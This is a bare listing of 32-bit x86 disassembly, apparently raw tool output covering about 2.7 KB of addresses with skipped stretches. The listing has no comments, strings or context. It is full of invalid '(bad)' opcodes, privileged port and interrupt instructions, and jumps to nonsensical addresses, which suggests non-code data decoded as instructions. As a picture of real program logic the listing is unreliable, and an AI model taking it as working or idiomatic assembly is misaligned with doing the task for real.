  420419:	repnz mov dh,0x5d
  42041c:	push   ebx
  42041d:	jb     0x4203cb
  42041f:	aaa    
  420420:	cdq    
  420421:	xchg   ebp,eax
  420422:	scas   eax,DWORD PTR es:[edi]
  420423:	xchg   esi,eax
  420424:	jmp    0x42040f
  420426:	popa   
  420427:	mov    DWORD PTR [ebx],esp
  420429:	mov    al,ds:0x91f40b9c
  42042e:	mov    dh,0x6d
  420430:	adc    BYTE PTR [esi+0x3b],0x76
  420434:	sub    eax,0x28abca68
  420439:	lahf   
  42043a:	pop    esi
  42043b:	push   eax
  42043c:	aaa    
  42043d:	ror    BYTE PTR [edi-0x20057a0a],1
  420443:	dec    ebp
  420444:	in     eax,0x8d
  420446:	and    esi,eax
  420448:	jg     0x420415
  42044a:	(bad)  
  42044b:	mov    ebp,0xc6ebd02a
  420450:	mov    WORD PTR cs:[edi+0x30a13710],ds
  420457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420458:	fucom  st(6)
  42045a:	cli    
  42045b:	int3   
  42045c:	dec    ebx
  42045d:	sub    ch,al
  42045f:	test   DWORD PTR [edi],ecx
  420461:	mov    edx,0xfc3e7d4e
  420466:	mov    WORD PTR [edi+ebp*4],?
  420469:	push   ebx
  42046a:	lahf   
  42046b:	ins    BYTE PTR es:[edi],dx
  42046c:	out    0x11,al
  42046e:	xchg   ecx,eax
  42046f:	sbb    edx,ebx
  420471:	pop    ebx
  420472:	pop    esi
  420473:	jmp    0x3a1909c5
  420478:	dec    ebp
  420479:	imul   ebx,edi,0x1bf32067
  42047f:	jecxz  0x420489
  420481:	pop    esi
  420482:	jne    0x4204ce
  420484:	ror    DWORD PTR [ebx+0x254e2823],cl
  42048a:	fiadd  WORD PTR ss:[edi]
  42048d:	adc    BYTE PTR [esi-0x38],ah
  420490:	and    BYTE PTR [ebx],al
  420492:	push   0xf54322e1
  420497:	imul   ebp,DWORD PTR [edi-0x3e],0x3f
  42049b:	add    ebx,DWORD PTR [ebx]
  42049d:	jge    0x420472
  42049f:	pop    eax
  4204a0:	xchg   ebx,eax
  4204a1:	mov    cl,0x33
  4204a3:	ds push es
  4204a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204a6:	outs   dx,BYTE PTR ds:[esi]
  4204a7:	jmp    0x420450
  4204a9:	test   al,0x3f
  4204ab:	adc    al,0xdd
  4204ad:	loope  0x420458
  4204af:	imul   esi
  4204b1:	cmp    al,cl
  4204b3:	mov    esi,0x98e56134
  4204b8:	push   ebx
  4204b9:	push   esi
  4204ba:	pop    ebx
  4204bb:	cmp    DWORD PTR [esi],0x3e42a90e
  4204c1:	xchg   ebx,eax
  4204c2:	inc    ebp
  4204c3:	xchg   edx,eax
  4204c4:	je     0x4204fa
  4204c6:	xchg   ebx,eax
  4204c7:	add    bh,dl
  4204c9:	cmp    eax,0x4e55ea1c
  4204ce:	es add al,0x7c
  4204d1:	les    ebp,FWORD PTR [edx+0x54]
  4204d4:	fidiv  DWORD PTR [edx]
  4204d6:	mov    dl,0x62
  4204d8:	in     al,dx
  4204d9:	cmp    ebx,esi
  4204db:	push   edx
  4204dc:	addr16 leave 
  4204de:	test   ebx,ebx
  4204e0:	out    dx,eax
  4204e1:	xor    DWORD PTR [ebp+0x6a],0x1b4e4d32
  4204e8:	mov    dh,0x74
  4204ea:	test   eax,0x839e8a
	...
  420553:	add    BYTE PTR [eax],al
  420555:	add    BYTE PTR [esi+0x7f125794],ch
  42055b:	shr    edi,cl
  42055d:	mov    esp,0x5a7f6c39
  420562:	cmp    ebx,ecx
  420564:	add    eax,0x15b6780
  420569:	add    BYTE PTR [eax],al
  42056b:	add    DWORD PTR [eax],eax
  42056d:	add    BYTE PTR ds:0x3fc35a9f,ah
  420573:	push   cs
  420574:	mov    esp,0x1a550c51
  420579:	sar    DWORD PTR [ebx],cl
  42057b:	(bad)
  42057e:	jnp    0x42053b
  420580:	(bad)  
  420581:	jecxz  0x4205c3
  420583:	gs sub eax,0x56f4e44
  420589:	adc    bh,al
  42058b:	adc    ecx,ebx
  42058d:	ror    ebx,0xda
  420590:	je     0x4205c5
  420592:	retf   
  420593:	jmp    DWORD PTR [edi]
  420595:	lahf   
  420596:	in     al,0x38
  420598:	outs   dx,DWORD PTR ds:[esi]
  420599:	out    0x5d,eax
  42059b:	jecxz  0x420520
  42059d:	sub    ebx,ecx
  42059f:	or     bh,BYTE PTR [ebp+0x73053d67]
  4205a5:	je     0x42055e
  4205a7:	jge    0x420619
  4205a9:	inc    eax
  4205aa:	rcl    BYTE PTR [edx-0x67],cl
  4205ad:	push   0x26
  4205af:	push   edi
  4205b0:	dec    edi
  4205b1:	mov    al,ds:0xaba03bb0
  4205b6:	daa    
  4205b7:	mov    bl,0xac
  4205b9:	push   0x2c298d07
  4205be:	(bad)  
  4205bf:	jmp    0x393e30b6
  4205c4:	xlat   BYTE PTR ds:[ebx]
  4205c5:	aaa    
  4205c6:	outs   dx,BYTE PTR ds:[esi]
  4205c7:	add    al,0xb6
  4205c9:	mov    bh,0x49
  4205cb:	sub    al,0xda
  4205cd:	pop    edx
  4205ce:	addr16 ja 0x4205ba
  4205d1:	(bad)  
  4205d2:	pop    ss
  4205d3:	clc    
  4205d4:	add    eax,0x45b69529
  4205d9:	lock sub eax,0xfe567f22
  4205df:	fistp  DWORD PTR ds:0x45f7c28f
  4205e5:	sbb    bh,BYTE PTR [ecx+0x6a]
  4205e8:	mov    esi,gs
  4205ea:	xor    eax,0xd02fd0d9
  4205ef:	push   ebp
  4205f0:	jb     0x4205a8
  4205f2:	dec    ebp
  4205f3:	jmp    0x420672
  4205f5:	xor    esp,ecx
  4205f7:	cmp    eax,0x6be34c6f
  4205fc:	arpl   WORD PTR [esi+0x1d8eaba6],cx
  420602:	jmp    DWORD PTR [esi]
  420604:	shr    DWORD PTR [ebx-0x3c],cl
  420607:	shl    BYTE PTR [edx],1
  420609:	xchg   edx,eax
  42060a:	cmp    BYTE PTR [esi-0x604c7b12],dl
  420610:	push   esi
  420611:	aad    0x54
  420613:	dec    ebp
  420614:	(bad)  [ebp+0x40]
  420617:	repnz test DWORD PTR [edx-0x70],edi
  42061b:	mov    ebx,ss
  42061d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42061e:	xchg   ebx,eax
  42061f:	xchg   esp,eax
  420620:	jmp    0xc08:0x2cd7d4a0
  420627:	not    BYTE PTR [esi-0x3b112013]
  42062d:	pop    ecx
  42062e:	inc    ebp
  42062f:	xor    DWORD PTR [edx],ebp
  420631:	imul   esp,DWORD PTR [edx],0x1e
  420634:	mov    cl,0x3b
  420637:	loop   0x420678
  420639:	jbe    0x42069d
  42063b:	shl    BYTE PTR [eax+0x6cadc898],cl
  420641:	shr    DWORD PTR [edx],1
  420643:	xlat   BYTE PTR ds:[ebx]
  420644:	or     eax,0xcc5d3d20
  420649:	cmp    ebp,0xffffff89
  42064c:	jae    0x420663
  42064e:	hlt    
  42064f:	jns    0x4205f4
  420651:	mov    al,ds:0xb6c8c41c
  420656:	dec    esi
  420657:	pop    ecx
  420658:	inc    ebx
  420659:	xor    BYTE PTR [edi],al
  42065b:	cmp    cl,BYTE PTR [eax+0x1d]
  42065e:	xor    esp,DWORD PTR [ebp-0x23667aa]
  420664:	stos   BYTE PTR es:[edi],al
  420665:	fucomip st,st(2)
  420667:	sub    BYTE PTR [edx+ecx*8],dh
  42066a:	adc    BYTE PTR [ecx+0x491c],0x0
	...
  4206d5:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4206dc:	mov    ah,0xec
  4206de:	lds    eax,FWORD PTR [eax]
  4206e0:	aad    0x78
  4206e2:	sar    DWORD PTR [edx+0x5c67b083],0x1
  4206e9:	add    BYTE PTR [eax],al
  4206eb:	add    DWORD PTR [eax],eax
  4206ed:	add    BYTE PTR [ecx+0x477bae52],al
  4206f3:	dec    edi
  4206f4:	popf   
  4206f5:	mov    edi,0xf0673df1
  4206fa:	test   ebp,0xfadb5b5d
  420700:	cmc    
  420701:	(bad)  
  420703:	dec    ebp
  420704:	lods   al,BYTE PTR ds:[esi]
  420705:	add    BYTE PTR [esi+0x24587191],al
  42070b:	ins    DWORD PTR es:[edi],dx
  42070c:	bound  esi,QWORD PTR [edi-0x2a1416ab]
  420712:	sar    DWORD PTR [edi+0x1d],1
  420715:	imul   ebx,DWORD PTR [ecx-0x42],0x5c400d84
  42071c:	pusha  
  42071d:	mov    ebx,0xe5071bf3
  420722:	fldenv [eax]
  420724:	mov    bl,0xd1
  420726:	and    ah,al
  420728:	jge    0x420788
  42072a:	das    
  42072b:	mov    ch,0xba
  42072d:	scas   al,BYTE PTR es:[edi]
  42072e:	mov    DWORD PTR [ecx+ebx*4],0x73cf47f1
  420735:	and    ecx,DWORD PTR ds:0xab75cf23
  42073b:	data16 daa 
  42073d:	mov    ds:0xb8efc1d7,al
  420742:	pusha  
  420743:	iret   
  420744:	sub    al,0xcc
  420746:	stos   BYTE PTR es:[edi],al
  420747:	xchg   esp,eax
  420748:	xchg   BYTE PTR [ebp-0x5],ah
  42074b:	mov    al,0x57
  42074d:	xor    edx,DWORD PTR [edi]
  42074f:	jo     0x420710
  420751:	push   ds
  420752:	test   ah,dl
  420754:	or     al,0x2e
  420756:	pushf  
  420757:	cld    
  420758:	sti    
  420759:	or     ecx,DWORD PTR [edi+0x5a523e3c]
  42075f:	push   edx
  420760:	mov    ecx,0x9202b448
  420765:	sbb    eax,0x2c2da05e
  42076a:	or     bh,BYTE PTR [ecx+ebp*8]
  42076d:	cmc    
  42076e:	adc    eax,0x73127c1c
  420773:	cwde   
  420774:	ins    BYTE PTR es:[edi],dx
  420775:	jle    0x42072a
  420777:	mov    ebx,0xeb280851
  42077c:	cmp    eax,DWORD PTR [eax+0x13]
  42077f:	nop
  420780:	rol    ebx,1
  420782:	jno    0x4207e1
  420784:	add    BYTE PTR [ebx-0x18],bl
  420787:	les    ebp,FWORD PTR ds:[esi]
  42078a:	fistp  DWORD PTR [edi-0x7b]
  42078d:	loope  0x420748
  42078f:	inc    eax
  420790:	lds    eax,FWORD PTR [ecx-0x6d29beba]
  420796:	inc    edi
  420797:	(bad)  
  420798:	mov    al,ds:0x999e5045
  42079d:	or     DWORD PTR [eax+edi*4+0x744c421e],esi
  4207a4:	outs   dx,DWORD PTR ds:[esi]
  4207a5:	inc    esi
  4207a6:	adc    DWORD PTR [esi],eax
  4207a8:	sub    al,BYTE PTR [ebx+eiz*4-0xf]
  4207ac:	jae    0x420773
  4207ae:	sub    eax,0x12042bbb
  4207b3:	out    dx,eax
  4207b4:	retf   0xa391
  4207b7:	add    DWORD PTR [ecx-0x5269be31],0xd28a5906
  4207c1:	shr    BYTE PTR [edi-0x9],cl
  4207c4:	cld    
  4207c5:	add    ebx,eax
  4207c7:	mov    esp,0x4fa79134
  4207cc:	repnz shl BYTE PTR [esi],1
  4207cf:	clc    
  4207d0:	xor    dh,BYTE PTR [ebp+ebx*1-0x14]
  4207d4:	sbb    edx,ebx
  4207d6:	and    DWORD PTR [ebx],esp
  4207d8:	xor    edx,DWORD PTR [ebx-0x57a89a10]
  4207de:	jge    0x420796
  4207e0:	push   edi
  4207e1:	and    al,bl
  4207e3:	test   al,0xf2
  4207e5:	gs xor al,0xfc
  4207e8:	ins    BYTE PTR es:[edi],dx
  4207e9:	jp     0x420867
  4207eb:	adc    DWORD PTR [edi-0x34],esp
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	xchg   edx,eax
  420863:	or     al,BYTE PTR ds:0x15d6742
  420869:	add    BYTE PTR [eax],al
  42086b:	add    DWORD PTR [eax],eax
  42086d:	add    al,dl
  42086f:	push   ds
  420870:	mov    ebp,ebp
  420872:	in     eax,0xe7
  420874:	daa    
  420875:	into   
  420876:	data16 (bad) 
  420878:	xchg   ebx,eax
  420879:	cmc    
  42087a:	mov    edi,0x579c8f9c
  42087f:	mov    ds:0xc3aa3b9c,eax
  420884:	ins    BYTE PTR es:[edi],dx
  420885:	mov    bl,0x9b
  420887:	dec    ebx
  420888:	sub    esi,esp
  42088a:	push   eax
  42088b:	ins    BYTE PTR es:[edi],dx
  42088c:	pop    esp
  42088d:	inc    eax
  42088e:	les    eax,FWORD PTR [esi-0x21]
  420891:	imul   edx,DWORD PTR [esi],0x9f49ebab
  420897:	xlat   BYTE PTR ds:[ebx]
  420898:	push   edx
  420899:	cmp    ah,BYTE PTR [edx]
  42089b:	add    eax,0xa4afa1ce
  4208a0:	stos   DWORD PTR es:[edi],eax
  4208a1:	fmul   DWORD PTR [ebx+edi*1+0x3c35314a]
  4208a8:	imul   esp,DWORD PTR [ecx],0x14
  4208ab:	lods   eax,DWORD PTR ds:[esi]
  4208ac:	popa   
  4208ad:	lds    ebx,FWORD PTR [ebx+edx*4]
  4208b0:	pop    ds
  4208b1:	mov    ebp,DWORD PTR [edx+0x12]
  4208b4:	cld    
  4208b5:	fcmovnbe st,st(0)
  4208b7:	jno    0x4208d8
  4208b9:	stc    
  4208ba:	mov    cl,0xa2
  4208bc:	test   DWORD PTR [ebp+0x587291ef],0x1e9b9f9f
  4208c6:	ret    
  4208c7:	jmp    0x2c79:0xda6cd071
  4208ce:	push   edx
  4208cf:	sbb    eax,0x52e57137
  4208d4:	mov    DWORD PTR [ecx-0x563a77b3],edx
  4208da:	icebp  
  4208db:	add    DWORD PTR [ebp+0x3b],esp
  4208de:	inc    eax
  4208df:	fwait
  4208e0:	xchg   esi,eax
  4208e1:	inc    ebx
  4208e2:	mov    ecx,0xa2034f5e
  4208e7:	rcr    DWORD PTR [ebx-0x58ef6c23],1
  4208ed:	cmc    
  4208ee:	ror    BYTE PTR [ebp+0x1c75c8b9],1
  4208f4:	test   al,0x80
  4208f6:	mov    dl,cl
  4208f8:	sti    
  4208f9:	cmp    al,0x61
  4208fb:	xor    bl,al
  4208fd:	jb     0x420961
  4208ff:	(bad)  [ebp+0xbf66983]
  420905:	pop    edi
  420906:	pop    ss
  420907:	xor    eax,0x777aeae5
  42090c:	mov    ds:0xfd18e4ef,al
  420911:	rol    BYTE PTR [edi+eiz*2],cl
  420914:	push   cs
  420915:	jl     0x42096e
  420917:	sbb    eax,0x8aec6174
  42091c:	retf   0xc135
  42091f:	repnz and al,0x15
  420922:	pop    edx
  420923:	cwde   
  420924:	mov    al,0x41
  420926:	mov    ah,0xcf
  420928:	xor    ebp,DWORD PTR [esi-0x14]
  42092b:	cdq    
  42092c:	fld    TBYTE PTR [ebx]
  42092e:	int3   
  42092f:	add    eax,0x6185cd81
  420934:	test   al,0xfe
  420936:	stc    
  420937:	jl     0x42092a
  420939:	dec    edx
  42093a:	fdivrp st(0),st
  42093c:	sbb    eax,0xef6bf31b
  420941:	inc    edx
  420942:	ret    0x78a0
  420945:	inc    eax
  420946:	mov    ecx,0x3582ce3d
  42094b:	lock shl DWORD PTR [edx+esi*8],1
  42094f:	jno    0x420915
  420951:	xchg   edx,eax
  420952:	scas   eax,DWORD PTR es:[edi]
  420953:	jecxz  0x4208e8
  420955:	ins    BYTE PTR es:[edi],dx
  420956:	aad    0x9
  420958:	lods   eax,DWORD PTR ds:[esi]
  420959:	nop
  42095a:	or     BYTE PTR [ebp+0x1f790491],cl
  420960:	xchg   ecx,eax
  420961:	mov    bh,0x22
  420963:	mov    ecx,0x4ff1a617
  420968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420969:	push   ebx
  42096a:	sub    al,cl
  42096c:	pop    ds
  42096d:	cmc    
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x9d
  4209e3:	xchg   esp,eax
  4209e4:	pop    eax
  4209e5:	lock addr16 pop esi
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	adc    cl,BYTE PTR [edx+0x28]
  4209f1:	js     0x420a5e
  4209f3:	push   edx
  4209f4:	sub    BYTE PTR [esi+0x1a1c9a16],0x9c
  4209fb:	sub    ebp,DWORD PTR [edi-0x78]
  4209fe:	xchg   esp,eax
  4209ff:	push   esp
  420a00:	xchg   esp,eax
  420a01:	mov    bl,BYTE PTR [eax+0x29]
  420a04:	jmp    0xe543:0x8c203938
  420a0b:	stos   DWORD PTR es:[edi],eax
  420a0c:	repnz dec ebx
  420a0e:	ja     0x4209ad
  420a10:	push   ebx
  420a11:	(bad)  
  420a12:	jnp    0x420a59
  420a14:	in     al,0x20
  420a16:	and    ebp,0x78
  420a19:	sub    esp,eax
  420a1b:	add    al,0x86
  420a1d:	mov    edx,0x8f228862
  420a22:	dec    ebp
  420a23:	dec    ebx
  420a24:	dec    DWORD PTR [ebx]
  420a26:	nop
  420a27:	mov    edx,0x18535192
  420a2c:	inc    esp
  420a2d:	pop    ebp
  420a2e:	add    cl,0x7c
  420a31:	mov    dl,0x78
  420a33:	cmp    al,0x6
  420a35:	xchg   esi,eax
  420a36:	pop    edi
  420a37:	xor    BYTE PTR [edi+eiz*4-0x742c1c40],bh
  420a3e:	fstp   st(3)
  420a40:	jno    0x420a47
  420a42:	push   ecx
  420a43:	mul    bh
  420a45:	and    eax,0xe61baa0d
  420a4a:	test   BYTE PTR [ebx-0xd2a469f],ah
  420a50:	outs   dx,DWORD PTR ds:[esi]
  420a51:	cmp    DWORD PTR [ecx],0x60f7e5cd
  420a57:	cli    
  420a58:	stos   DWORD PTR es:[edi],eax
  420a59:	cmp    ch,bh
  420a5b:	mov    ds,WORD PTR [ebp+0x38]
  420a5e:	inc    esp
  420a5f:	push   ss
  420a60:	pop    edx
  420a61:	pop    edx
  420a62:	mov    dh,0x28
  420a64:	sub    cl,al
  420a66:	pop    edi
  420a67:	sub    ebx,DWORD PTR [ebp+0x2e]
  420a6a:	(bad)  
  420a6c:	dec    edi
  420a6d:	dec    esp
  420a6e:	and    ah,al
  420a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a71:	mov    eax,ds:0xffc0e558
  420a76:	leave  
  420a77:	mov    ch,0x25
  420a79:	lds    edx,FWORD PTR [ebx+0x19]
  420a7c:	push   ebx
  420a7d:	fwait
  420a7e:	retf   0x76fc
  420a81:	dec    edi
  420a82:	test   al,0xa5
  420a84:	sti    
  420a85:	stos   DWORD PTR es:[edi],eax
  420a86:	cmp    eax,0x51dbf880
  420a8b:	imul   esi,DWORD PTR [edx+edi*1],0x1cce40b4
  420a92:	or     edx,ebx
  420a94:	leave  
  420a95:	outs   dx,DWORD PTR ds:[esi]
  420a96:	ins    BYTE PTR es:[edi],dx
  420a97:	(bad)  
  420a98:	mov    ebp,0xd2846962
  420a9d:	or     eax,0x42b301ac
  420aa2:	pushf  
  420aa3:	mov    bh,0x57
  420aa5:	dec    edx
  420aa6:	and    cl,BYTE PTR [ebp-0x5b]
  420aa9:	fist   WORD PTR [ebx+0x4f010194]
  420aaf:	jno    0x420abe
  420ab1:	push   ss
  420ab2:	repnz or dl,BYTE PTR [esi-0x3b47dac6]
  420ab9:	mov    ds:0x3384a27d,eax
  420abe:	into   
  420abf:	mov    cl,0x76
  420ac1:	mov    eax,DWORD PTR [edx]
  420ac3:	jnp    0x420a83
  420ac5:	xor    DWORD PTR [edi],ebx
  420ac7:	xchg   esp,eax
  420ac8:	jb     0x420b44
  420aca:	(bad)  
  420acb:	jns    0x420af1
  420acd:	xor    ebp,DWORD PTR [edx]
  420acf:	push   ecx
  420ad0:	fistp  WORD PTR [ecx+edi*8+0x18]
  420ad4:	data16 fisub DWORD PTR [esp+eiz*8+0x53]
  420ad9:	mov    ds:0xaadc00a1,al
  420ade:	xlat   BYTE PTR ds:[ebx]
  420adf:	mov    bl,0x61
  420ae1:	inc    esp
  420ae2:	loop   0x420aca
  420ae4:	fistp  DWORD PTR [edx-0x60ab10fa]
  420aea:	jo     0x420b20
  420aec:	out    dx,eax
  420aed:	adc    al,BYTE PTR [eax]
	...
  420b53:	add    BYTE PTR [eax],al
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	pop    esi
  420b63:	adc    BYTE PTR [eax],0x2f
  420b66:	addr16 pop edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	ins    DWORD PTR es:[edi],dx
  420b6f:	push   0xffffff82
  420b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b72:	or     esi,DWORD PTR [ebp-0xb1aea73]
  420b78:	lea    ebp,[ecx+0x17]
  420b7b:	xchg   esp,eax
  420b7c:	dec    ecx
  420b7d:	arpl   WORD PTR [eax-0x69],dx
  420b80:	fidivr DWORD PTR [edi-0x3a]
  420b83:	push   cs
  420b84:	mov    al,ds:0xce5cfbd1
  420b89:	jge    0x420bee
  420b8b:	hlt    
  420b8c:	jp     0x420bdf
  420b8e:	cmp    al,0xfd
  420b90:	in     eax,dx
  420b91:	mov    edx,0x5729e88b
  420b96:	popf   
  420b97:	add    ebp,DWORD PTR [ebp+0x138d4472]
  420b9d:	xlat   BYTE PTR ds:[ebx]
  420b9e:	mov    bl,0xa3
  420ba0:	dec    ecx
  420ba1:	dec    esp
  420ba2:	les    ecx,FWORD PTR [edi]
  420ba4:	and    DWORD PTR [ebx+0x64],ebx
  420ba7:	inc    ebx
  420ba8:	(bad)  
  420ba9:	enter  0x9a05,0xca
  420bad:	cdq    
  420bae:	push   esi
  420baf:	inc    esp
  420bb0:	aad    0xaf
  420bb2:	mov    esp,0x27070de3
  420bb7:	mov    eax,0x89d6d76b
  420bbc:	cld    
  420bbd:	and    ecx,DWORD PTR [edx-0x6a]
  420bc0:	inc    edx
  420bc1:	cwde   
  420bc2:	cli    
  420bc3:	sub    ebx,0x1e
  420bc6:	repz push edx
  420bc8:	and    ebx,ecx
  420bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bcb:	xchg   DWORD PTR [ecx],edi
  420bcd:	and    DWORD PTR [ebp-0x67506302],esi
  420bd3:	jb     0x420c30
  420bd5:	dec    esp
  420bd6:	mov    BYTE PTR [ecx],bh
  420bd8:	les    ebp,FWORD PTR [esi]
  420bda:	shl    bh,0xe9
  420bdd:	jnp    0x420b72
  420bdf:	sbb    eax,0xe4b5bd8
  420be4:	pop    ds
  420be5:	and    BYTE PTR ds:0x54ce3199,dl
  420beb:	popf   
  420bec:	aas    
  420bed:	out    0xb6,al
  420bef:	ja     0x420b7e
  420bf1:	dec    edx
  420bf2:	pop    ds
  420bf3:	sbb    edx,DWORD PTR [ecx+0x1e7bad18]
  420bf9:	outs   dx,DWORD PTR ds:[esi]
  420bfa:	shr    BYTE PTR [edi-0x3b],1
  420bfd:	xor    eax,0x5d8dd27d
  420c02:	or     BYTE PTR [ecx-0x4ef098b],ah
  420c08:	sahf   
  420c09:	retf   
  420c0a:	cmp    DWORD PTR [edi-0x50f1cf1c],ebx
  420c10:	test   eax,0x82907aed
  420c15:	ss (bad) 
  420c17:	rol    DWORD PTR [edi],0xa9
  420c1a:	inc    esi
  420c1b:	fimul  WORD PTR [edi-0x790b48cd]
  420c21:	repnz bnd jmp 0x420bdb
  420c25:	loopne 0x420be4
  420c27:	out    dx,eax
  420c28:	fcmove st,st(2)
  420c2a:	push   cs
  420c2b:	add    BYTE PTR [ebx],al
  420c2d:	adc    esp,DWORD PTR [ebx+0x63]
  420c30:	adc    dh,BYTE PTR [eax-0x5932bf7b]
  420c36:	or     eax,0xb1284991
  420c3b:	dec    esp
  420c3c:	loopne 0x420c54
  420c3e:	jl     0x420c3f
  420c40:	hlt    
  420c41:	js     0x420c7c
  420c43:	jmp    0x420c6f
  420c45:	out    0x99,al
  420c47:	sbb    bh,BYTE PTR [edx+0x68606d29]
  420c4d:	inc    eax
  420c4e:	mov    edx,0x5d6fd4a9
  420c53:	call   0x2841:0x8ca86b9a
  420c5a:	js     0x420ca0
  420c5c:	mov    al,ds:0x508ca8c3
  420c61:	int    0x9b
  420c63:	push   0xec2d605f
  420c68:	ja     0x9d2a020e
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0x7
  420ce3:	ja     0x1a2742a
  420ce9:	add    BYTE PTR [eax],al
  420ceb:	add    DWORD PTR [eax],eax
  420ced:	add    BYTE PTR ds:0xe9fca683,bl
  420cf3:	cmp    al,0xf2
  420cf5:	repz dec ecx
  420cf7:	dec    edx
  420cf8:	mov    BYTE PTR [eax],cl
  420cfa:	sub    BYTE PTR [ebx],dh
  420cfc:	dec    ebp
  420cfd:	gs cmp cl,al
  420d00:	jl     0x420cd2
  420d02:	sbb    ecx,ebx
  420d04:	pop    ds
  420d05:	dec    edx
  420d06:	ins    DWORD PTR es:[edi],dx
  420d07:	clc    
  420d08:	test   al,0x3d
  420d0a:	int    0xde
  420d0c:	sbb    BYTE PTR [ebx],bl
  420d0e:	jns    0x420d39
  420d10:	out    dx,eax
  420d11:	fistp  DWORD PTR [esp+ebx*2-0xd]
  420d15:	dec    edx
  420d16:	adc    ebp,DWORD PTR [ebx-0xd]
  420d19:	jmp    0x9803c386
  420d1e:	jns    0x420d25
  420d20:	mov    ds:0xad931b2e,eax
  420d25:	rcl    dh,cl
  420d27:	pop    ecx
  420d28:	lea    ebp,ds:0xcec5fd6a
  420d2e:	inc    esi
  420d2f:	xchg   ecx,eax
  420d30:	lods   al,BYTE PTR ds:[esi]
  420d31:	add    eax,0xf9da7bc4
  420d36:	ficom  WORD PTR [ebp+0x5076a62d]
  420d3c:	ror    BYTE PTR [ebx-0x13],0x65
  420d40:	mov    al,0x13
  420d42:	mov    al,ds:0x2790bd79
  420d47:	mov    ch,0x65
  420d49:	xchg   esp,eax
  420d4a:	and    eax,0xed6a7179
  420d4f:	jmp    0xec039019
  420d54:	push   ecx
  420d55:	xchg   bh,ch
  420d57:	cmc    
  420d58:	inc    edi
  420d59:	mov    eax,0xbc189aaa
  420d5e:	and    al,0xa6
  420d60:	dec    ebx
  420d61:	xor    al,0x40
  420d63:	inc    ebx
  420d64:	loope  0x420cf8
  420d66:	jne    0x420d19
  420d68:	aaa    
  420d69:	or     al,0x59
  420d6b:	neg    eax
  420d6d:	sub    BYTE PTR [eax],dl
  420d6f:	mov    ah,0xf1
  420d71:	sbb    al,0x65
  420d73:	or     DWORD PTR [eax],ebp
  420d75:	sub    eax,0x3e8f073
  420d7a:	pushf  
  420d7b:	sub    ch,bh
  420d7d:	jmp    0x420dc8
  420d7f:	dec    edx
  420d80:	push   esi
  420d81:	pop    es
  420d82:	punpckhdq mm6,QWORD PTR [ecx+0x4]
  420d86:	ja     0x420dba
  420d88:	and    ebp,DWORD PTR [edx-0x7f]
  420d8b:	repz push cs
  420d8d:	mov    dh,0xa1
  420d8f:	sub    ch,BYTE PTR [edx+0x2fe5d314]
  420d95:	out    dx,al
  420d96:	inc    ecx
  420d97:	push   edi
  420d98:	adc    bh,BYTE PTR [ecx+0x7f]
  420d9b:	dec    esp
  420d9c:	pushf  
  420d9d:	outs   dx,DWORD PTR ds:[esi]
  420d9e:	out    0x30,eax
  420da0:	dec    esi
  420da1:	cmp    eax,0x155e95db
  420da6:	repz ficomp WORD PTR [ebp-0x1ad8ceb]
  420dad:	mov    edi,DWORD PTR [ebp+0x35]
  420db0:	test   BYTE PTR [esi],cl
  420db2:	sahf   
  420db3:	mov    ebp,0xb39971b8
  420db8:	std    
  420db9:	les    edi,FWORD PTR [eax-0x6feddbc9]
  420dbf:	cmp    dl,0x2d
  420dc2:	icebp  
  420dc3:	dec    BYTE PTR [esi-0x34]
  420dc6:	or     ah,BYTE PTR [esi-0xaddb6c9]
  420dcc:	neg    eax
  420dce:	jnp    0x420d98
  420dd0:	outs   dx,DWORD PTR ds:[esi]
  420dd1:	add    DWORD PTR [ebx-0x44d5dec8],esp
  420dd7:	jno    0x420e22
  420dd9:	dec    ebx
  420dda:	loop   0x420df4
  420ddc:	popf   
  420ddd:	lock mov edx,DWORD PTR [esi+0x53]
  420de1:	repz inc esi
  420de3:	loop   0x420e0a
  420de5:	ficom  WORD PTR [edx]
  420de7:	pop    ebx
  420de8:	push   ss
  420de9:	jl     0x420e47
  420deb:	(bad)  
  420ded:	sbb    DWORD PTR [eax],eax
	...
  420e53:	add    BYTE PTR [eax],al
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0x22b440d7
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	scas   eax,DWORD PTR es:[edi]
  420e6f:	fldcw  WORD PTR [eax-0x65]
  420e72:	pop    ss
  420e73:	mov    edx,0x8a3568
  420e78:	jg     0x420e14
  420e7a:	mov    dh,0xd7
  420e7c:	push   ebp
  420e7d:	cmc    
  420e7e:	vmulpd ymm2,ymm5,ymm6
  420e82:	jo     0x420ed5
  420e84:	out    dx,eax
  420e85:	rol    DWORD PTR [ecx+0x24e8961b],1
  420e8b:	shl    BYTE PTR [eax],cl
  420e8d:	or     DWORD PTR [edx-0x32],eax
  420e90:	push   eax
  420e91:	stos   BYTE PTR es:[edi],al
  420e92:	mov    ?,eax
